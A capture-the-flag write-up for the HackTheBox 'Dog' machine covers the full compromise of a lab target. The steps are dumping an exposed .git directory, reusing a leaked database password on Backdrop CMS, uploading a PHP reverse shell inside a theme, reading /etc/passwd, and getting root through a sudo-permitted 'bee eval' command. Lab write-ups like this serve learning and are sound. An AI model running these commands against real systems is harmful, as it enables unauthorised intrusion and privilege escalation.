# Write Up for The HTB Dog box 

## Enumeration

Launching into the Box my IP was `10.10.11.58`

Using Nmap I will Scan the Ip for open Ports `nmap -sV -T4 <ip>`

<img width="776" height="204" alt="NmapDogPortScan" src="https://github.com/user-attachments/assets/221694be-8075-46e3-a92e-24ef1ec1235b" />

We can see there is a http service running so I run `nmap -sC <ip>` to use scripts to get more information.

<img width="790" height="389" alt="NmapDogWebScan" src="https://github.com/user-attachments/assets/70c2cd36-51f8-46aa-bfb7-ba217ccd5f3c" />

## Expoiting web misconfiguration

First thing that comes up is `Backdrop CMS` which will be important later.

 We also see that the websites `/.git` is exposed to the internet which is a configuration error. 

 Using a program called git-dumper we can grab the contents. `git-dumper http://10.10.11.58/.git dog.git`

 \***Note**\* this wasent installed for me so I used the command `pipx install git-dumper` To download the program.
 
<img width="654" height="239" alt="dogGitFile" src="https://github.com/user-attachments/assets/f5e14571-8c63-42f5-9007-8bc4b54e8530" />

Using Nano I can look into the `settings.php` to try and find the password the database \(Backdrop CMS\) uses to connect to the website

<img width="664" height="270" alt="settingsPassword" src="https://github.com/user-attachments/assets/f317ac79-0c0e-4fc4-8c43-fd6c2f1efd52" />

Here we can see a password being used `BackDropJ2024DS2024` I try to use this password with usernames but have no luck 

I used grep to find the root string in the setting.php and see the email dog@dog.htb. Using `grep -ir dog.htb` I found another user `tiffany@dog.htb`

<img width="813" height="148" alt="tiffany" src="https://github.com/user-attachments/assets/c525b6aa-d338-4dc7-807c-b0d71de599eb" />

Using the Credentials `Username : tiffany Password: BackDropJ2024DS2024` We are into the dashboard!

## Grabing a foothold in the system

First thing to check is the Version that the service is running on to see if there are any known vulnerabilities that can help us.

After Searching around I found that under Reports there is a page called Status report that shows us `Backdrop CMS Version 1.27.1`

<img width="1181" height="605" alt="version" src="https://github.com/user-attachments/assets/19054124-f5ee-4bf8-95df-56b00b991ff5" />

Searching for CVEs I found one on OpenCVE https://app.opencve.io/cve/CVE-2022-42092 

<img width="1188" height="1043" alt="Cve" src="https://github.com/user-attachments/assets/fd6cc396-ba28-4443-9873-765bb4c98b94" />

Reading through the provided resource https://grimthereaperteam.medium.com/backdrop-cms-1-22-0-unrestricted-file-upload-themes-ad42a599561c We need to download a theme and then place a shell inside.

Importing a shell form the /webshell/php folder I use nano to set the required fields.

<img width="365" height="166" alt="Shell" src="https://github.com/user-attachments/assets/d8957c49-21b1-4103-901d-c5b858b9c8dc" />

After creating that I downloaded a random theme I found on Github https://github.com/backdrop-contrib/modoc

I then unziped the folder with `unzip modoc-1.x-1.x.zip` and placeing my new shell1.php file into the folder then using TAR to "rezip" the folder. 

Zip was not a supported option while TAR is

<img width="1801" height="789" alt="themeinstall" src="https://github.com/user-attachments/assets/53a8165c-5467-483e-9e30-16224dd6368a" />

After uploading our file lets set up a listener with `nc -lvnp 4444` so we can access the backend when we activate our reverse shell.

We now need to traverse to the file location that we placed our theme in `http://10.10.11.58/themes/` and here we see our new theme open it and click on our shell to Activate!
 
<img width="576" height="659" alt="shellactivate" src="https://github.com/user-attachments/assets/2fe74599-927c-48d8-be37-d6ae32df8327" />

After Clicking the File your Shell should open in your NC terminal. We now want to see users that have shells activated `cat /etc/passwd`

This will help us to see all the users on the systems. We are looking for users with /bin/bash that would have shells activated

<img width="576" height="659" alt="shellactivate" src="https://github.com/user-attachments/assets/3f0d7875-a235-4bed-81e3-a52f02112214" />

I tried the password for all 3 users and the one that worked was `johncusack`. using Switch user or SU i was able to log in as `johncusack` with that password we used prior.

I needed to upgrade my shell to type commands so I used `python3 -c 'import pty; pty.spawn("/bin/bash")'` This is where you find the user flag!

<img width="539" height="233" alt="upgrade" src="https://github.com/user-attachments/assets/493c9880-8a7f-45ec-bcd9-f27d72efcc5c" />

## Elevated Privilages

Now we need to get to root. Using `sudo -l` we can see what john can use sudo on which is this bee command. 

<img width="807" height="180" alt="sudo" src="https://github.com/user-attachments/assets/761251f7-6764-4299-8e83-7778d58d8394" />

Using the `bee` command at the bottom are the advanced commands where I see `eval` which is a powerful tool. 

<img width="670" height="275" alt="eval" src="https://github.com/user-attachments/assets/f139e95b-131c-4e2c-b75b-40b2fbe79a3e" />

Looking on GTFObins I see we can use php to get a root shell using `CMD="/bin/sh" sudo php -r "system('$CMD');"`

After taking that information and using bee i crafted the command `sudo /usr/local/bin/bee eval "system('$CMD');"` I got an Error at first and needed to move to the /var/www/html directory.

<img width="638" height="411" alt="root" src="https://github.com/user-attachments/assets/96415ec5-4554-4a8d-9f71-90b75aeeed66" />

We now have ROOT! we can grab the flag and we are done!



